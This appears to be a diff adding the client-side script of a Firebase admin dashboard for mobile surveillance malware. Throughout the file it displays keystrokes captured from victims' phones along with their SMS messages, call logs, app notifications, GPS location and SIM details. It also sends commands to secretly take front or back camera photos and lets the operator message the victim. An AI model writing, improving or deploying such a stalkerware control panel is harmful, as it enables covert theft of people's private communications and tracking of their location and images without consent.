+                const mainChatButton = document.querySelector('.category-btn[data-category="chat"]');
+                const existingMainIndicator = mainChatButton.querySelector('.chat-notification-indicator');
+                if (existingMainIndicator) existingMainIndicator.remove();
+                
+                if (listItem.querySelector('.sidebar-indicator')) {
+                    const newMainIndicator = document.createElement('div');
+                    newMainIndicator.className = 'chat-notification-indicator';
+                    mainChatButton.appendChild(newMainIndicator);
+                }
+
+                if (window.innerWidth <= 992) {
+                    sidebar.classList.remove('open');
+                    overlay.style.display = 'none';
+                }
+            }
+        });
+
+        categoryButtonsContainer.addEventListener('click', (e) => {
+            const button = e.target.closest('.category-btn');
+            if (button) {
+                openModal(dataModal);
+                displayCategoryData(button.dataset.category);
+            }
+        });
+
+        toggleSidebarBtn.addEventListener('click', () => dashboard.classList.toggle('sidebar-hidden'));
+        
+        menuBtn.addEventListener('click', () => {
+            sidebar.classList.add('open');
+            overlay.style.display = 'block';
+        });
+
+        overlay.addEventListener('click', (e) => {
+            if(e.target === overlay) {
+                sidebar.classList.remove('open');
+                overlay.style.display = 'none';
+            }
+        });
+
+        document.querySelectorAll('.modal-close-btn').forEach(btn => {
+            btn.addEventListener('click', e => closeModal(e.target.closest('.modal-overlay')));
+        });
+        
+        document.querySelectorAll('.modal-overlay').forEach(modal => {
+            modal.addEventListener('click', e => {
+                if(e.target === modal) closeModal(modal);
+            });
+        });
+        
+        sendNotificationBtn.addEventListener('click', () => {
+            if (selectedUserInfo.userId) {
+                document.getElementById('notification-modal-title').textContent = `Send Notification to ${selectedUserInfo.userName}`;
+                notificationMessageInput.value = '';
+                openModal(notificationModal);
+            } else { alert('Please select a user first.'); }
+        });
+        
+        sendNotificationSubmitBtn.addEventListener('click', () => {
+            const message = notificationMessageInput.value.trim();
+            if (message && selectedUserInfo.userId && selectedUserInfo.childKey) {
+                push(ref(db, `user/${selectedUserInfo.userId}/${selectedUserInfo.childKey}/adminNotifications`), { message: message, timestamp: serverTimestamp(), read: false })
+                    .then(() => { alert('Notification sent successfully!'); closeModal(notificationModal); })
+                    .catch(error => { alert('Failed to send notification: ' + error.message); });
+            }
+        });
+
+        // --- Data Rendering ---
+        function displayCategoryData(category) {
+            document.querySelectorAll('.category-btn').forEach(btn => btn.classList.remove('active'));
+            const currentBtn = document.querySelector(`.category-btn[data-category="${category}"]`);
+            if (currentBtn) currentBtn.classList.add('active');
+            
+            if (activeDataListener) { off(activeDataListener.ref, 'value', activeDataListener.callback); activeDataListener = null; }
+            
+            modalDataDisplayArea.innerHTML = '<div class="loader"></div>';
+            
+            const { userId, childKey } = selectedUserInfo;
+            if (!userId || !childKey) {
+                modalDataDisplayArea.innerHTML = '<p>Please select a user first.</p>';
+                return;
+            }
+            
+            document.getElementById('modal-title').textContent = `${category.charAt(0).toUpperCase() + category.slice(1)} Data`;
+
+            if (category === 'photo') { renderPhotosFromDatabase(userId, childKey); return; }
+            if (category === 'chat') { renderChat(userId, childKey); return; }
+            
+            const dataPath = `user/${userId}/${childKey}/${getCategoryPath(category)}`;
+            const dataRef = ref(db, dataPath);
+            const callback = (snapshot) => { 
+                if (category === 'keylogger') {
+                    setupKeyloggerDisplay(snapshot.val());
+                } else {
+                    renderData(category, snapshot.val());
+                }
+            };
+            
+            onValue(dataRef, callback);
+            activeDataListener = { ref: dataRef, callback: callback };
+        }
+        
+        function handleKeyloggerScroll() {
+            if (modalDataDisplayArea.scrollTop + modalDataDisplayArea.clientHeight >= modalDataDisplayArea.scrollHeight - 20) {
+                renderKeyloggerBatch();
+            }
+        }
+
+        function setupKeyloggerDisplay(data) {
+            modalDataDisplayArea.removeEventListener('scroll', handleKeyloggerScroll);
+            let headerHTML = `<div class="data-header"><button class="clear-category-btn" data-category="keylogger"><span>Clear keylogger Data</span></button></div>`;
+            
+            if (!data || Object.keys(data).length === 0) {
+                modalDataDisplayArea.innerHTML = headerHTML + '<p>No data available in this category.</p>';
+                return;
+            }
+
+            fullKeyloggerData = Object.values(data).reverse();
+            renderedKeyloggerCount = 0;
+            modalDataDisplayArea.innerHTML = headerHTML + '<div class="keylog-list" id="keylogger-list-container"></div>';
+
+            renderKeyloggerBatch();
+            modalDataDisplayArea.addEventListener('scroll', handleKeyloggerScroll);
+        }
+
+        function renderKeyloggerBatch() {
+            if (isKeyloggerLoading || renderedKeyloggerCount >= fullKeyloggerData.length) return;
+            isKeyloggerLoading = true;
+            
+            const keyloggerList = document.getElementById('keylogger-list-container');
+            if (!keyloggerList) { isKeyloggerLoading = false; return; }
+
+            const end = renderedKeyloggerCount + KEYLOGGER_BATCH_SIZE;
+            const batch = fullKeyloggerData.slice(renderedKeyloggerCount, end);
+
+            let contentHTML = '';
+            batch.forEach(log => {
+                if (log && log.keyText) {
+                    const parts = log.keyText.split(' |');
+                    const time = parts[0] || '';
+                    const action = (parts[1] || 'Action').replace(/[()]/g, '');
+                    const text = parts[2] || 'N/A';
+                    contentHTML += `<div class="keylog-card"><div class="keylog-header"><div class="keylog-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="M6 8h.01M10 8h.01M14 8h.01M18 8h.01M6 12h.01M10 12h.01M14 12h.01M18 12h.01M8 16h8"/></svg></div><strong class="keylog-action">${action}</strong></div><p class="keylog-text">${text}</p><div class="keylog-footer">${time}</div></div>`;
+                }
+            });
+
+            keyloggerList.insertAdjacentHTML('beforeend', contentHTML);
+            renderedKeyloggerCount = end;
+            isKeyloggerLoading = false;
+        }
+
+        function renderChat(userId, childKey) {
+            const chatButton = document.querySelector('.category-btn[data-category="chat"]');
+            if (chatButton) {
+                const mainIndicator = chatButton.querySelector('.chat-notification-indicator');
+                if(mainIndicator) mainIndicator.remove();
+            }
+            
+            const activeUserItem = document.querySelector(`.user-list-item[data-userid="${userId}"][data-childkey="${childKey}"]`);
+            if(activeUserItem) {
+                const sidebarIndicator = activeUserItem.querySelector('.sidebar-indicator');
+                if(sidebarIndicator) sidebarIndicator.remove();
+            }
+
+            modalDataDisplayArea.innerHTML = `<div class="live-chat-area"><div class="chat-messages" id="chat-messages-area"><div class="loader"></div></div><div class="chat-input-area"><input type="text" id="chat-message-input" placeholder="Type a message..."><button id="chat-send-btn"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg></button></div></div>`;
+            
+            const chatMessagesArea = document.getElementById('chat-messages-area');
+            const chatMessageInput = document.getElementById('chat-message-input');
+            const chatSendBtn = document.getElementById('chat-send-btn');
+            const chatPath = `chats/${userId}/${childKey}/messages`;
+            const chatRef = ref(db, chatPath);
+
+            const callback = (snapshot) => {
+                const messages = snapshot.val();
+                if (messages) {
+                    chatMessagesArea.innerHTML = '';
+                    const sortedKeys = Object.keys(messages).sort((a,b) => messages[a].timestamp - messages[b].timestamp);
+                    sortedKeys.forEach(key => {
+                        const message = messages[key];
+                        const bubble = document.createElement('div');
+                        bubble.classList.add('chat-bubble', message.sender);
+                        const time = message.timestamp ? new Date(message.timestamp).toLocaleString([], { dateStyle: 'short', timeStyle: 'short' }) : '';
+                        bubble.innerHTML = `${message.text.replace(/\n/g, '<br>')}<span class="chat-time">${time}</span>`;
+                        chatMessagesArea.prepend(bubble);
+                    });
+                } else {
+                    chatMessagesArea.innerHTML = '<p style="text-align:center; padding: 2rem;">No messages yet.</p>';
+                }
+            };
+            onValue(chatRef, callback);
+            activeDataListener = { ref: chatRef, callback: callback };
+
+            const sendMessage = () => {
+                const messageText = chatMessageInput.value.trim();
+                if (messageText) {
+                    push(ref(db, chatPath), { text: messageText, sender: 'admin', timestamp: serverTimestamp() });
+                    chatMessageInput.value = '';
+                }
+            };
+            chatSendBtn.addEventListener('click', sendMessage);
+            chatMessageInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') sendMessage(); });
+        }
+        
+        function renderData(category, data) {
+            let headerHTML = '';
+            let contentHTML = '';
+            const hasData = data && typeof data === 'object' && Object.keys(data).length > 0;
+            if (category !== 'location' && category !== 'devicestatus' && hasData) {
+                headerHTML = `<div class="data-header"><button class="clear-category-btn" data-category="${category}"><span>Clear ${category} Data</span></button></div>`;
+            }
+            if (!hasData) {
+                contentHTML = '<p>No data available in this category.</p>';
+            } else {
+                const dataArray = (category !== 'devicestatus' && category !== 'location') ? Object.values(data).reverse() : [];
+                switch(category) {
+                    case 'location':
+                        let mapLink = '';
+                        if (data.latitude && data.longitude) {
+                             mapLink = `<a href="https://maps.google.com/?q=${data.latitude},${data.longitude}" target="_blank" class="map-link"><span>View on Google Maps</span></a>`;
+                        }
+                        contentHTML = `<div class="location-card" style="font-size: 1.1rem; line-height: 1.8;">
+                                        <div style="display:flex; align-items:flex-start; gap:1rem; margin-bottom: 1.5rem;">
+                                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 10c0 6-8 12-8 12s-8-6-8-12a8 8 0 0 1 16 0Z"/><circle cx="12" cy="10" r="3"/></svg>
+                                            <div><strong>Address:</strong><br>${data.address || 'N/A'}</div>
+                                        </div>
+                                        <div style="display:flex; align-items:flex-start; gap:1rem;">
+                                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+                                            <div><strong>Time:</strong><br>${data.dateTime || 'N/A'}</div>
+                                        </div>
+                                        ${mapLink}
+                                    </div>`;
+                        break;
+                    case 'sms':
+                        contentHTML = '<div class="sms-card-list">';
+                        dataArray.forEach(sms => {
+                            if (sms) {
+                                const isOutgoing = sms.type === 2;
+                                const cardClass = isOutgoing ? 'outgoing' : 'incoming';
+                                const icon = isOutgoing ? `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-green)" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="17" y1="7" x2="7" y2="17"></line><polyline points="17 17 7 17 7 7"></polyline></svg>` : `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-blue)" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="7" y1="17" x2="17" y2="7"></line><polyline points="7 7 17 7 17 17"></polyline></svg>`;
+                                const addressLabel = isOutgoing ? 'To:' : 'From:';
+                                contentHTML += `<div class="sms-card ${cardClass}"><div class="sms-card-header"><div class="sms-card-icon">${icon}</div><div class="sms-card-address">${addressLabel} ${sms.smsAddress || 'N/A'}</div></div><div class="sms-card-body">${sms.smsBody || ''}</div><div class="sms-card-footer">${sms.dateTime || ''}</div></div>`;
+                            }
+                        });
+                        contentHTML += '</div>';
+                        break;
+                    case 'notifications':
+                         contentHTML = '<div class="notification-list">';
+                         dataArray.forEach(notif => {
+                             if (notif) {
+                                 let appIcon = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-red)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg>`;
+                                 const fullText = `${notif.title || ''} ${notif.text || ''}`.toLowerCase();
+                                 if (fullText.includes('whatsapp')) { appIcon = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="#25D366"><path d="M19.78 4.22a10.4 10.4 0 0 0-14.9 0 10.4 10.4 0 0 0 0 14.9l-1.38 5.02 5.13-1.35a10.4 10.4 0 0 0 14.9 0 10.4 10.4 0 0 0 0-14.9zM12 20.9a8.8 8.8 0 0 1-4.5-1.2L4 21l1.3-3.5a8.8 8.8 0 1 1 6.7 3.4zM16.4 13.6c-.2-.1-.8-.4-1-.4s-.3-.1-.4.1-.4.4-.5.5-.2.1-.4 0c-.2-.1-1-1-1.8-1.8-.7-.6-1.1-1.4-.9-1.6s.2-.3.3-.4c.1-.1.2-.2.3-.3.1-.1 0-.2 0-.3s-1-2.3-1.3-3.2c-.3-.8-.6-1-.8-1s-.4-.1-.6-.1h-.3c-.2 0-.5.1-.7.3-.2.2-.8.8-1 2s-1.2 2.3-.9 3.3c.3 1 1.1 2.4 2.5 3.8 1.4 1.4 2.8 2.2 4.3 2.7 1.5.5 2.8.4 3.8.3.9-.1 2.3-1 2.6-1.9.3-.9.3-1.7.2-1.9s-.3-.3-.5-.4z"/></svg>`; }
+                                 contentHTML += `<div class="notification-card"><div class="notification-header"><div class="notification-icon">${appIcon}</div><strong class="notification-title">${notif.title || 'Notification'}</strong></div><p class="notification-body">${notif.text || ''}</p><div class="notification-footer">${notif.dateTime || ''}</div></div>`;
+                             }
+                         });
+                         contentHTML += '</div>';
+                         break;
+                    case 'calllogs':
+                        contentHTML = '<div class="sms-card-list">'; // Reusing SMS styles for consistency
+                        dataArray.forEach(call => {
+                            if (call) {
+                                let icon, title, cardClass;
+                                switch (String(call.type).toUpperCase()) {
+                                    case 'INCOMING':
+                                        icon = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-green)" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 11 12 14 22 4"></polyline><path d="M21 12v7a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11"></path></svg>`;
+                                        title = `Incoming Call`;
+                                        cardClass = 'incoming';
+                                        break;
+                                    case 'OUTGOING':
+                                        icon = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-blue)" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="7" y1="17" x2="17" y2="7"></line><polyline points="7 7 17 7 17 17"></polyline></svg>`;
+                                        title = `Outgoing Call`;
+                                        cardClass = 'outgoing';
+                                        break;
+                                    case 'MISSED':
+                                    default:
+                                        icon = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-red)" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>`;
+                                        title = `Missed Call`;
+                                        cardClass = '';
+                                        break;
+                                }
+                                contentHTML += `<div class="sms-card ${cardClass}"><div class="sms-card-header"><div class="sms-card-icon">${icon}</div><div class="sms-card-address">${title}</div></div><div class="sms-card-body"><strong>Number:</strong> ${call.phoneNumber || 'N/A'}<br><strong>Duration:</strong> ${call.duration || '0'}s</div><div class="sms-card-footer">${new Date(call.date).toLocaleString() || ''}</div></div>`;
+                            }
+                        });
+                        contentHTML += '</div>';
+                        break;
+                    case 'devicestatus':
+                        const status = data;
+                        contentHTML = `
+                            <div class="data-card">
+                                 <div class="sms-card-header" style="margin-bottom: 2rem;">
+                                    <div class="sms-card-icon">
+                                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-blue)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+                                    </div>
+                                    <div class="sms-card-address">Current Device Status</div>
+                                </div>
+                                <div class="data-card-body">
+                                    <div class="status-item" style="flex-direction: column; align-items: flex-start; gap: 0.5rem; padding-bottom: 1.5rem; background: transparent;">
+                                        <div style="width:100%; display:flex; justify-content: space-between;">
+                                            <span class="status-item-label">Battery</span>
+                                            <span class="status-item-value">${status.batteryLevel || 'N/A'}%</span>
+                                        </div>
+                                        <div class="battery-level">
+                                            <div class="battery-level-fill" style="width: ${status.batteryLevel || 0}%;"></div>
+                                        </div>
+                                    </div>
+                                    <div class="status-grid">
+                                        <div class="status-item">
+                                            <span class="status-item-label">Internet</span>
+                                            <span class="status-item-value ${status.internetOn ? 'on' : 'off'}">${status.internetOn ? 'On' : 'Off'}</span>
+                                        </div>
+                                        <div class="status-item">
+                                            <span class="status-item-label">Network Type</span>
+                                            <span class="status-item-value">${status.networkType || 'N/A'}</span>
+                                        </div>
+                                        <div class="status-item">
+                                            <span class="status-item-label">SIM Operator</span>
+                                            <span class="status-item-value">${status.simOperator || 'N/A'}</span>
+                                        </div>
+                                        <div class="status-item">
+                                            <span class="status-item-label">SIM 1</span>
+                                            <span class="status-item-value">${status.sim1Number || 'N/A'}</span>
+                                        </div>
+                                        <div class="status-item">
+                                            <span class="status-item-label">SIM 2</span>
+                                            <span class="status-item-value">${status.sim2Number || 'N/A'}</span>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="data-card-footer">Last updated: ${new Date(status.lastUpdated).toLocaleString() || 'N/A'}</div>
+                            </div>`;
+                        break;
+                 }
+            }
+            modalDataDisplayArea.innerHTML = headerHTML + contentHTML;
+        }
+        
+        // --- बेहतर और लचीला फंक्शन: डेटाबेस से तस्वीरें दिखाएं ---
+        function renderPhotosFromDatabase(userId, childKey) {
+            const headerHTML = `<div class="data-header"><button class="capture-photo-btn" data-facing="1"><span>Capture Front Photo</span></button><button class="capture-photo-btn" data-facing="0"><span>Capture Back Photo</span></button><button id="refresh-photos-btn"><span>Refresh</span></button><button class="clear-category-btn" data-category="photo"><span>Clear Photos</span></button></div>`;
+            modalDataDisplayArea.innerHTML = headerHTML + '<div class="loader"></div>';
+
+            const photoDataRef = ref(db, `user/${userId}/${childKey}/photo/data`);
+            
+            const callback = (snapshot) => {
+                const photos = snapshot.val();
+                if (!photos || Object.keys(photos).length === 0) {
+                    modalDataDisplayArea.innerHTML = headerHTML + '<p>No photos available.</p>';
+                    return;
+                }
+
+                // नवीनतम तस्वीरों को पहले दिखाने के लिए ऑब्जेक्ट मानों को उलट दें
+                const photosWithData = Object.values(photos).reverse();
+
+                if (photosWithData.length === 0) {
+                    modalDataDisplayArea.innerHTML = headerHTML + '<p>No valid photo URLs found.</p>';
+                    return;
+                }
+
+                let photoGridHTML = '<div class="photo-grid">';
+                photosWithData.forEach(photoData => {
+                    // सुनिश्चित करें कि photoData एक ऑब्जेक्ट है और इसमें urlPhoto प्रॉपर्टी है
+                    if (typeof photoData === 'object' && photoData !== null && photoData.urlPhoto) {
+                        const url = photoData.urlPhoto; // सही प्रॉपर्टी का उपयोग करें
+                        const timeCreated = photoData.dateTime || 'N/A'; // सही प्रॉपर्टी का उपयोग करें
+                        photoGridHTML += `<div class="photo-card"><img src="${url}" alt="Captured photo" onerror="this.onerror=null;this.src='https://placehold.co/200x180/2a2a2a/e0e0e0?text=Error';"><div class="photo-info"><span class="photo-time">${timeCreated}</span><a href="${url}" target="_blank" class="view-btn"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg></a></div></div>`;
+                    }
+                });
+                photoGridHTML += '</div>';
+                modalDataDisplayArea.innerHTML = headerHTML + photoGridHTML;
+            };
+
+            // किसी भी पिछले लिसनर को हटाएं
+            if (activeDataListener) {
+                off(activeDataListener.ref, 'value', activeDataListener.callback);
+            }
+
+            // नया लिसनर संलग्न करें और उसे स्टोर करें
+            onValue(photoDataRef, callback);
+            activeDataListener = { ref: photoDataRef, callback: callback };
+        }
+
+
+        modalDataDisplayArea.addEventListener('click', (e) => {
+            const button = e.target.closest('button');
+            if (!button) return;
+            const { userId, childKey, userName } = selectedUserInfo;
+            
+            if (button.classList.contains('clear-category-btn')) {
+                const category = button.dataset.category;
+                if (confirm(`Are you sure you want to delete all ${category} data for '${userName}'? This cannot be undone.`)) {
+                    if (category === 'photo') { 
+                        clearAllPhotos(userId, childKey); 
+                    } else { 
+                        remove(ref(db, `user/${userId}/${childKey}/${getCategoryPath(category)}`))
+                            .then(() => alert(`${category} data cleared.`))
+                            .catch((err) => alert(`Error: ${err.message}`));
+                    }
+                }
+            }
+            
+            if (button.classList.contains('capture-photo-btn')) {
+                const facing = button.dataset.facing;
+                if (facing === undefined) return;
+                const paramsRef = ref(db, `user/${userId}/${childKey}/photo/params`);
+                const span = button.querySelector('span');
+                const originalText = span.textContent;
+                button.disabled = true; span.textContent = 'Sending...';
+                update(paramsRef, { capturePhoto: true, facingPhoto: parseInt(facing) })
+                    .then(() => { 
+                        span.textContent = 'Command Sent!'; 
+                        setTimeout(() => { span.textContent = originalText; button.disabled = false; }, 3000); 
+                    })
+                    .catch((error) => { 
+                        console.error("Error sending command: ", error); 
+                        alert("Failed to send command."); 
+                        span.textContent = originalText; 
+                        button.disabled = false; 
+                    });
+            }
+
+            if (button.id === 'refresh-photos-btn') { 
+                renderPhotosFromDatabase(userId, childKey); 
+            }
+        });
+
+        function getCategoryPath(category) {
+            switch(category) {
+                case 'location': return 'location/data';
+                case 'photo': return 'photo/data';
+                case 'keylogger': return 'keyLogger/data';
+                case 'sms': return 'sms/data';
+                case 'notifications': return 'notificationsMessages/data';
+                case 'calllogs': return 'Calls';
+                case 'devicestatus': return 'DeviceStatus';
+                default: return '';
+            }
+        }
+        
+        // --- बेहतर क्लियर फंक्शन ---
+        async function clearAllPhotos(userId, childKey) {
+            // पुष्टि (confirmation) इवेंट लिसनर में संभाली जाती है
+            modalDataDisplayArea.innerHTML = '<div class="loader"></div><p>Deleting photo records...</p>';
+            try {
+                // सिर्फ Realtime Database से फोटो के रिकॉर्ड्स हटाएं।
+                // renderPhotosFromDatabase का सक्रिय onValue लिसनर अपने आप UI को अपडेट कर देगा।
+                await remove(ref(db, `user/${userId}/${childKey}/photo/data`));
+                alert('All photo records have been deleted.');
+            } catch (error) {
+                console.error("Error clearing photo records:", error);
+                alert("An error occurred while deleting photo records.");
+                // यदि डिलीट करने में कोई त्रुटि होती है तो उपयोगकर्ता को वर्तमान स्थिति दिखाने के लिए फिर से रेंडर करें।
+                renderPhotosFromDatabase(userId, childKey);
+            }
+        }
+    </script>
+</body>
+</html>
+
+
